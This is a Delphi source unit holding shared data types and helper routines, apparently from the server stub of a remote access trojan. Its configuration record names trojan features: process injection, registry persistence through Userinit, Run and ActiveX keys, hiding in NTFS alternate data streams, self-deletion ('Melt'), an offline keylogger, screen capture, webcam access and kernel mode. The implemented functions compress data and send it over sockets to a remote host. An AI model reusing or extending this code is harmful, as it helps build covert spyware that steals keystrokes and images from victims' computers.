unit UnitSharedData;

interface

uses
  applicationunit,
  windows,CompressionStreamUnit,
  //untaPlib,
  WInsock2,
  SocketUnit;

type
  TSocketData = class
    Data: string;
    RemoteHost: string;
    RemotePort: integer;
    MainSocket: bool;
    ConnectionString: string;
    PingReceived: bool;
    ThreadHandle: THandle;
    FileHandle: THandle;
    WebcamSocket: bool;
  end;


  TServerData = record
    AssignedGroup: string;
    AssignedName: string;
    InstallFolder: string;
    InstallName: string;
    Injection: string;
    UserInit: string;
    RegRun: string;
    Activex: string;
    RegRunKey: string;
    ActiveXKey: string;
    Persistent: string;
    Connections: string;
    CopyToAds: string;
    OfflineLogger: string;
    OfflineScreenCapture: string;
    Melt: string;
    UserMode: string;
    KernelMode: string;
    Password: string;
    SleepInterval: string;
    FolderSize: string; 
  end;

var
  ServerData: TServerData;
  CaptureWindow: THandle;
  OffLineKeyLogger: bool;
  OffLineScreenCapture: bool;
  StartedAt: int64;
  function IntToStr(I: integer): string;
  function StrToInt(S: string): integer;
  function Compress(const data: string): string;
  function Decompress(const data: string): string;
  function Split(Input: string; Deliminator: string; Index: integer): string;
  procedure SendData(Socket: TClientSocket; Data: string);
  procedure SendStream(Socket: TClientSocket; Stream: TMemoryStream);
  function MakePathNormal(Path: string): string;
  function MakePathAds(Path: string): string;


implementation

function MakePathAds(Path: string): string;
begin
  Result := Path;

  if Copy(Result,Length(Result),1) <> ':' then begin
    Result := Copy(Result,1,Length(Result)-1);
    if Copy(Result,Length(Result),1) <> ':' then Result := Result + ':';
  end;

end;

function MakePathNormal(Path: string): string;
begin
  Result := Path;

  if Length(Result) = 2 then begin
    Result := Result + '\';
    exit;
  end;

  if Copy(Result,Length(Result),1) <> '\' then begin
    Result := Copy(Result,1,Length(Result)-1);
    Result := Result + '\';
  end;
end;

function IntToStr(I: integer): string;
begin
  Str(I, Result);
end;

function StrToInt(S: string): integer;
begin
  Val(S, Result, Result);
end;


{function Compress(const data: string): string;
var
  lpBaseAddressIn, lpBuffer: Pointer;
  Size: dword;
begin
  Size := Length(Data);
  lpBuffer := CompressMemory(@Data[1], Size);
  SetString(Result,pchar(lpBuffer),Size);
  Result := 'CF1' +  Result;
end;

function Decompress(const data: string): string;
var
  Size: dword;
  lpBaseAddressIn, lpBuffer: Pointer;
begin
  Size := Length(Data);
  lpBuffer := DecompressMemory(@Data[1], Size);
  SetString(Result,pchar(lpBuffer),Size);
  exit;
end;}

function Compress(const data: string): string;
var
  CompressionStream: TCompressionStream;
  OutputStream: TMemoryStream;
begin
  try
    OutputStream := TMemoryStream.Create;
    CompressionStream := TCompressionStream.Create(OutputStream,zcMax); // zcFastest //zcMax
    CompressionStream.Write(pointer(Data)^,Length(Data));
    CompressionStream.Free;
    SetString(Result, PChar(OutputStream.Memory), OutputStream.Size);
  finally
    OutputStream.Free;
  end;
end;

function Decompress(const data: string): string;
var
  DecompressionStream: TDecompressionStream;
  InputStream,OutputStream: TMemoryStream;
begin
  try
    InputStream := TMemoryStream.Create;
    OutputStream := TMemoryStream.Create;
    InputStream.Write(pointer(Data)^,Length(Data));
    InputStream.Position := 0;
    DecompressionStream := TDecompressionStream.Create(InputStream);
    DecompressionStream.Position := 0;
    OutputStream.CopyFrom(DecompressionStream, 0);
    SetString(Result,pchar(OutputStream.memory),OutputStream.size);
  finally
    DecompressionStream.Free;
    OutputStream.Free;
    InputStream.Free;
  end;
end;

function Split(Input: string; Deliminator: string; Index: integer): string;
var
  StringLoop, StringCount: integer;
  Buffer: string;
begin
  StringCount := 0;
  for StringLoop := 1 to Length(Input) do begin
    if (Copy(Input, StringLoop, 1) = Deliminator) then begin
      Inc(StringCount);
      if StringCount = Index then begin
        Result := Buffer;
        Exit;
      end else begin
        Buffer := '';
      end;
    end else begin
      Buffer := Buffer + Copy(Input, StringLoop, 1);
    end;
  end;
  Result := Buffer;
end;

{function Split(Input: string; Deliminator: string; Index: integer): string;
var
  i,n1: integer;
begin
  i := 0;

  while true do begin

    if Input = '' then exit;
    n1 := pos(Deliminator,Input);

    if n1 = 0 then begin
      Result := Input;
      exit;
    end;

    Result := copy(Input,1,n1-1);
    Delete(Input,1,n1);

    inc(i);
    if i = Index then exit;

  end;
end;}

procedure Send(Socket: TClientSocket; Data: string);
var
  Temp: string;
begin
  while (Length(Data) > 0) and (Socket.Connected) do begin
    Temp := Copy(Data,1,4096);
    Delete(Data,1,4096);
    repeat
      Sleep(10);
    until Socket.SendBuffer(pointer(Temp)^,length(Temp)) <> -1;
    sleep(10);
  end;
end;

procedure SendData(Socket: TClientSocket; Data: string);
begin
  Data := Compress(Data);
  Data := inttostr(length(Data)) + '|' + Data;

  if Socket = nil then exit;
  if not Socket.Connected then Exit;

  //if Length(Data) > 4096 then begin
    Send(Socket,Data);
 { end else begin
    Socket.SendString(Data);
  end;}
end;

procedure SendStream(Socket: TClientSocket; Stream: TMemoryStream);
var
  Data: string;
begin
  SetString(Data,pchar(Stream.memory),Stream.size);
  SendData(Socket,Data);
end;


end.
